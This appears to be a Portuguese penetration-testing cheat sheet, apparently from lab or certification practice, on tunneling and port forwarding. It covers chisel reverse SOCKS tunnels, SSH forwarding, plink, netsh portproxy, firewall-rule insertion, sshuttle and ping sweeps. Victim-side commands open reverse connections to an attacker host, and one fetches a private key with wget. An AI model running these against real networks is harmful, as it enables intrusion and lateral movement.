Tunelamento e encaminhamento de portas
========================

## Comandos mais utilizados

**Cenário Windows**

No  Windows utilizamos o chisel, porém em ambientes mais maduros o Antivírus pega essa ferramenta. [Vide exemplo de como usá-la](#chisel)

    chisel.exe client <ip_atacante>:<porta> R:<porta>:socks

Exemplo:

    ./chisel.exe client 10.10.14.8:9999 R:5000:127.0.0.1:8888

ou

    ./chisel.exe client 10.10.14.8:9999 R:5000:socks

Na máquina do atacante (Kali Linux)

    chisel server -p <porta> --socks5 --reverse

Exemplo

        chisel server -p 9999 --socks5 --reverse

Depois é necessário configurar o proxychains:

    echo "socks5 127.0.0.1 5000" >> /etc/proxychains.conf
    #Comentar a diretiva "proxy_dns"

**Cenário Linux**

Dinâmico. Na máquina do atacante devemos gerar uma chave privada e pública para evitar de mandar a senha para o servidor remoto:

    ssh-keygen
    mkdir /home/acosta/.ssh
    cat id_rsa.pub >> /home/acosta/.ssh/authorized_keys

Na máquina da vítima temos de prepara o permissionamento da chave privada para acessar a máquina atacante:

    wget http://10.10.10.10/id_rsa -O id_rsa
    chmod 600 id_rsa

No cenário de acessar um web server na porta 8000 local por meio da máquina do atacante na porta 127.0.0.1:5555

    ssh -nNT -i id_rsa -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -R 5555:127.0.0.1:8000 acosta@10.10.14.10 -p 2222&

No cenário de fazer isso com o mysql, por exemplo:

    ssh -nNT -i id_rsa -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -R 5555:127.0.0.1:3306 acosta@10.10.14.10 -p 2222&

## Chisel

Referência: <https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683>

Encaminhamento de porta dinâmico

Na máquina vítima, executar o seguinte comando:

    chisel client 192.168.49.120:3477 R:5000:socks
    # O IP informado no comando é o IP da máquina atacante
    
    
    # O comando abaixo eh para redirecionar portas locais para a maquina do atacante:
    # client <IP atacante>:<porta atacante> R (remote) <porta vitima>:interface do_atacante:porta_atacante
    ./chisel.exe client 10.10.14.8:9999 R:5000:127.0.0.1:8888
    
    
Vale considera que precisamos liberar no firewall as portas pelas quais vamos receber a conexão:

    netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.10.10.204 localport=445 action=allow
    # o IP informado neste comando é o mesmo IP da máquina da vítima.
    
Na máquina do atacante, configurar da seguinte maneira:
    
    chisel server -p 3477 --socks5 --reverse
    
    echo "socks5 127.0.0.1 5000" >> /etc/proxychains.conf
    #Comentar a diretiva "proxy_dns"

**ISSO É FUNDAMENTAL PARA QUE O ENCAMINHAMENTO DE PORTA FUNCIONE**
    

![type:video](https://youtube.com/embed/hi5Z4ePdAG0)

## SSH

Referências:
https://erev0s.com/blog/ssh-local-remote-and-dynamic-port-forwarding-explain-it-i-am-five/

### Local port forwarding

Acessando localmente uma porta para que chegue no servidor especificado:

    ssh -L 9999:localhost:9999 host1
    ssh -L 9999:localhost:1234 -N host2
    sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
    
    ssh -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -L 127.0.0.1:80:172.30.100.189:80 svc_tbra@10.237.169.18 -nNT
    <CTRL+Z>
    bg


    ssh -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -L 5000:127.0.0.1:5000 acosta@10.10.14.17 -nNT

onde -L bind address na minha máquina:porta_minha_maquina:host_que_eu_quero_alcançar:porta_que_eu_quero_alcançar
    
OBS: Embora ele não chama a shell do servidor remoto, mas o terminal fica preso, portanto é necessário exeutar estes últimos dois comandos para  continuar com o terminal disponível para execução de comandos.


### Remote Port Forwarding

    ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
    
    ssh -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -R 192.168.150.52:5555:127.0.0.1:5555 -nNT student@192.168.150.52 -p 2222
    
onde, a conexão que for estabelecida na porta 5555 do host_remoto (192.168.150.52) é feito o encaminhamento para a minha máquina 127.0.0.1 na porta 5555

OBS: Vale ressaltar que para que isso funcione conforme o esperado, é necessário o sshd_conf esteja configurado com o "GatewayPort yes", caso contrário a porta só escutara na interface interna (loopback ou 127.0.0.1)

### Dynamic Port Forwarding

    sudo ssh -nNT -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -D 127.0.0.1:22 student@192.168.150.52 -p 222
    
    tail /etc/proxychains4.conf                                                                                                                                                                                                             
    #
    #       proxy types: http, socks4, socks5, raw
    #         * raw: The traffic is simply forwarded to the proxy without modification.
    #        ( auth types supported: "basic"-http  "user/pass"-socks )
    #
    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    socks4  127.0.0.1 1234
        
    
    proxychains nmap -sT -n -Pn 127.0.0.1 --open

OBS: Nesse caso o scan deve ocorrer na localhost, pois o serviço escuta somente na interface local! Mas vale considerar que estou realizando o scan na interface local do SERVER REMOTO. O que me surrpeendeu, porque eu não imaginei isso! De qualquer forma, é interessante levar em conta que eu sairia com o IP 

## rinetd

    sudo apt update
    sudo apt install rinetd
    cat vi /etc/rinetd.conf
    
    # forwarding rules come here
    #
    # you may specify allow and deny rules after a specific forwarding rule
    # to apply to only that forwarding rule
    #
    # bindadress    bindport  connectaddress  connectport
            0.0.0.0    80    www.google.com    80
    
    
    sudo systemctl start rinetd
    


## Plink.exe

OBS: Sem interação

    plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
    
    plink.exe -ssh -l kali -pw R3dT3@m -R 192.168.49.120:1080:3389 192.168.49.120

OBS: Com interação

    cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4

## netsh

netsh é uma utilidade que deve ser utilizada com privilégios elevados. Para o cenário do nosso teste, já com SYSTEM na máquina, não temos de lidar com UAC, portanto, podemos prosseguir com a condução dos testes. Primeiro devemos chegar se o serviço IP Helper está ativo:

    services

![b47f02d3bb0d8d154a6027a84543ce8c-port_redirection_and_tunneling_03](../../media/b47f02d3bb0d8d154a6027a84543ce8c-port_redirection_and_tunneling_03.png)

### local port forwarding

    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=10.11.1.13 connectport=80 connectaddress=10.11.1.123
    
    netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.120.101 connectport=445 connectaddress=172.16.120.102
    
    netsh interface portproxy add v4tov4 listenport=8089 listenaddress=172.16.120.101 connectport=8090 connectaddress=192.168.49.120
    
Se atentar com o firewall. Ele pode bloquear nossas conexões. Sendo assim, devemos inserir uma regra básica nele...

    netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
    
    netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=172.16.120.101 localport=8089 action=allow

## HTTP Tunnel

    apt-cache search httptunnel
    sudo apt install httptunnel
    
    hts --forward-port localhost:8888 1234
    ps aux | grep hts
    ss -antp | grep "1234"
    
    htc --forward-port 8080 10.11.0.128:1234
    ps aux | grep htc
    ss -antp | grep "8080"
    

## sshuttle

Esta ferramenta consiste em fazer um túnel via SSH em conjunto com regras de iptables para tunelar o tráfego a partir da camada 4, o que seria um conceito próximo ao de uma VPN, mas com o protocolo SSH.

O comando é relativamente simples. Atentar-se ao fato de que o IPV6 pode interferir na utilização da ferramenta para situações onde somente o IPV4 é utilizado, então recomendo remover a funcionalidade do ipv6 com a flag "--disable-ipv6"

    sshuttle --disable-ipv6 -r user@192.168.1.5 192.168.145.0/24
    
  Em conexões onde o SSH utiliza chave pública, podemos utilizar o comando:
  
      sshuttle --disable-ipv6 -e "ssh -i /pasta/chave_publica" -r user@192.168.1.5 192.168.145.0/24

Este conceito é interessante caso tenha um firewall no meio do caminho entre a máquina atacante e a vítimia.

## netsh (windows)

Esse comando funciona como um proxy, sendo a máquina na qual foi executada o comando fazendo a função de proxy e e máquina informada no parâmetro "connectaddress" a máquina que você quer atacar, assim como o "connectport"  seria na porta da máquina alvo que você quer atacar. O listenport recebe o valor da porta pela qual você quer proxiar para atacar o alvo

    netsh interface portproxy add v4tov4 listenport=81 connectport=445 connectaddress=192.168.175.202
    
Lembrando que temos que nos atentar ao firewall que pode bloaquear as portas que estamos utilizando com o seguinte comando:

    netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=81 action=allow
    

## ping sweep windows

    for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.

## ping sweep linux

    for i in {1..254}; do ping -c 2 10.5.5.$i; done